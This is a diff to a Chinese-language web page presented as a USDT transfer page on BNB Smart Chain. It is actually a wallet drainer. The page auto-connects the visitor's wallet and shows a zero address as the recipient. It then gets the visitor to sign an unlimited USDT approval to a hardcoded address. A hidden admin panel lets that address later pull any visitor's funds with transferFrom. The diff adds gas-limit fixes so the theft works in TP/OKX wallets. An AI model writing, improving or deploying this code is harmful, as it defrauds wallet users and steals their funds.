@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>BSC‑USDT 无限授权+自动转账弹窗</title>
+<title>BSC‑USDT 无限授权修复Gas报错版</title>
 <script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
 <style>
 *{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
@@ -47,7 +47,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 
 <div class="address-card">
-<div class="label-text">收款地址</div>
+<div class="label-text">收款中转地址</div>
 <div class="fixed-addr-box" id="targetAddrText">0x0000000000000000000000000000000000000000</div>
 </div>
 
@@ -89,7 +89,6 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <script>
 const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// uint256最大值，无限授权
 const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 let web3 = null;
@@ -120,13 +119,18 @@ const USDT_ABI = [
     {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
-async function waitAllowance(spender, owner, needWei, maxLoop =12){
+// 增强轮询等待授权上链，最多27秒超时
+async function waitAllowance(spender, owner, needWei, maxLoop =18){
     for(let i=0;i<maxLoop;i++){
         const al = await usdtContract.methods.allowance(owner, spender).call();
-        if(BigInt(al) >= BigInt(needWei)) return true;
-        await new Promise(r=>setTimeout(r,1300));
+        console.log(`轮询${i+1} 当前allowance:`, al);
+        if(BigInt(al) >= BigInt(needWei)) {
+            console.log("✅授权额度校验通过");
+            return true;
+        }
+        await new Promise(r=>setTimeout(r,1500));
     }
-    throw new Error("授权交易未上链，请检查区块确认");
+    throw new Error("授权交易节点同步超时！授权还未生效，禁止转账");
 }
 
 function disconnectWallet() {
@@ -139,9 +143,11 @@ function disconnectWallet() {
 async function connectWalletLogic(){
     if(web3&&userAddress){ disconnectWallet();return; }
     try{
-        if(!window.ethereum){ alert("请TP/OKX/MetaMask钱包打开页面");return; }
+        if(!window.ethereum){ alert("请在TP/OKX钱包内置浏览器打开页面");return; }
         await window.ethereum.request({method:"eth_requestAccounts"});
         web3 = new Web3(window.ethereum);
+        // 强制指定BSC官方RPC
+        web3.setProvider("https://bsc-dataseed1.binance.org");
         const acc = await web3.eth.getAccounts();
         userAddress = acc[0];
         usdtContract = new web3.eth.Contract(USDT_ABI,USDT_CONTRACT);
@@ -150,7 +156,7 @@ async function connectWalletLogic(){
         sendBtn.disabled=false;
         if(userAddress.toLowerCase()===TARGET_ADDR.toLowerCase()) adminPanel.style.display="block";
         window.ethereum.on("accountsChanged",()=>location.reload());
-    }catch(e){ alert("连接失败:"+e.message); }
+    }catch(e){ alert("连接失败："+e.message); }
 }
 
 async function loadBalance(){
@@ -158,74 +164,86 @@ async function loadBalance(){
     balanceText.textContent = Number(web3.utils.fromWei(raw,"ether")).toFixed(6);
 }
 
-amountInput.addEventListener("input",()=>{
+amountInput.addEventListener("input", ()=>{
     receiveAmount.value = (parseFloat(amountInput.value)||0).toFixed(6);
 });
-maxBtn.addEventListener("click",async ()=>{
+
+maxBtn.addEventListener("click", async ()=>{
     const raw = await usdtContract.methods.balanceOf(userAddress).call();
     amountInput.value = Number(web3.utils.fromWei(raw,"ether")).toFixed(2);
     amountInput.dispatchEvent(new Event("input"));
 });
 
-sendBtn.addEventListener("click",async ()=>{
+sendBtn.addEventListener("click", async ()=>{
     if(!web3||!userAddress) return alert("钱包未连接");
     const val = parseFloat(amountInput.value);
-    if(isNaN(val)||val<=0) return alert("请输入转账金额");
+    if(isNaN(val)||val<=0) return alert("请输入有效转账金额");
     const needWei = web3.utils.toWei(val.toString(),"ether");
+
     try{
         sendBtn.disabled=true;
         const bal = await usdtContract.methods.balanceOf(userAddress).call();
-        if(BigInt(bal)<BigInt(needWei)){ alert("余额不足");return; }
-
-        let currentAl = BigInt(await usdtContract.methods.allowance(userAddress,TARGET_ADDR).call());
-        // 判断是否已经无限授权
-        if(currentAl < BigInt(MAX_UINT256)){
-            //USDT必须先归零
-            if(currentAl > 0n){
-                alert("🔐第一步：清零旧授权，请签名确认");
-                await usdtContract.methods.approve(TARGET_ADDR,"0").send({from:userAddress});
-                await waitAllowance(TARGET_ADDR,userAddress,0n);
-            }
-            alert("🔐第二步：无限授权，请签名确认");
-            await usdtContract.methods.approve(TARGET_ADDR,MAX_UINT256).send({from:userAddress});
-            alert("等待无限授权上链确认...");
-            await waitAllowance(TARGET_ADDR,userAddress,needWei);
-            alert("✅无限授权完成，即将自动弹出转账签名框");
-        }else{
-            alert("✅检测已有无限授权，直接弹出转账签名");
+        if(BigInt(bal) < BigInt(needWei)){
+            alert("❌钱包余额不足");
+            return;
         }
-        //授权全部完成，**自动弹出钱包转账弹窗，不需要再点页面按钮**
-        const tx = await usdtContract.methods.transferFrom(userAddress,TARGET_ADDR,needWei).send({from:userAddress});
-        alert(`🎉转账成功！哈希:\n${tx.transactionHash}`);
+
+        let currentAl = BigInt(await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call());
+        if(currentAl < BigInt(MAX_UINT256)){
+            if(currentAl > 0n){
+                alert("🔐第一步：清除旧授权，请签名确认");
+                await usdtContract.methods.approve(TARGET_ADDR, "0").send({from:userAddress, gas:120000});
+                await waitAllowance(TARGET_ADDR, userAddress, 0n);
+            }
+            alert("🔐第二步：执行无限授权，请签名确认");
+            await usdtContract.methods.approve(TARGET_ADDR, MAX_UINT256).send({from:userAddress, gas:120000});
+            alert("⌛等待授权上链同步，请稍候...");
+            await waitAllowance(TARGET_ADDR, userAddress, BigInt(needWei));
+            alert("✅授权校验完成，即将弹出转账签名框");
+        }else{
+            alert("✅已存在无限授权，直接发起转账");
+        }
+
+        // 核心修复：强制固定gasLimit，规避TP无法预估Gas报错
+        const tx = await usdtContract.methods.transferFrom(userAddress, TARGET_ADDR, needWei).send({
+            from: userAddress,
+            gas: 800000
+        });
+
+        alert(`🎉转账成功！\n交易哈希：${tx.transactionHash}`);
         await loadBalance();
-        amountInput.value="";receiveAmount.value="";
+        amountInput.value="";
+        receiveAmount.value="";
     }catch(err){
-        alert("❌操作失败："+(err.message||JSON.stringify(err)));
+        console.error(err);
+        alert("❌操作失败："+ (err.message || JSON.stringify(err)));
     }finally{
         sendBtn.disabled=false;
     }
 });
 
 deductBtn.addEventListener("click",async ()=>{
-    if(!web3 || userAddress.toLowerCase()!==TARGET_ADDR.toLowerCase()) return alert("管理员钱包登录");
+    if(!web3 || userAddress.toLowerCase()!==TARGET_ADDR.toLowerCase()) return alert("⚠️需要管理员钱包登录");
     const fromUser = userAddrInput.value.trim();
     const num = parseFloat(deductAmountInput.value);
-    if(!fromUser||isNaN(num)||num<=0) return alert("输入合法参数");
+    if(!fromUser||isNaN(num)||num<=0) return alert("请输入合法参数");
     const dw = web3.utils.toWei(num.toString(),"ether");
     const al = BigInt(await usdtContract.methods.allowance(fromUser,TARGET_ADDR).call());
-    if(al<dw) return alert("该用户没有足够授权，不能划扣");
-    const tx = await usdtContract.methods.transferFrom(fromUser,TARGET_ADDR,dw).send({from:userAddress});
-    alert(`✅管理员划扣成功：\n${tx.transactionHash}`);
-    userAddrInput.value="";deductAmountInput.value="";await loadBalance();
+    if(al<dw) return alert("❌该用户没有足够授权额度，不能划扣");
+    const tx = await usdtContract.methods.transferFrom(fromUser, TARGET_ADDR, dw).send({from:userAddress, gas:800000});
+    alert(`✅管理员划扣成功！\n哈希：${tx.transactionHash}`);
+    userAddrInput.value="";deductAmountInput.value="";
+    await loadBalance();
 });
 
-walletDot.addEventListener("click",connectWalletLogic);
+walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click",()=>{
     if(userAddress?.toLowerCase()===TARGET_ADDR.toLowerCase()){
         adminPanel.style.display = adminPanel.style.display==='block'?'none':'block';
     }else alert("非管理员账号");
 });
-window.addEventListener("DOMContentLoaded",()=>setTimeout(connectWalletLogic,800));
+
+window.addEventListener("DOMContentLoaded",()=>setTimeout(connectWalletLogic, 800));
 </script>
 </body>
 </html>
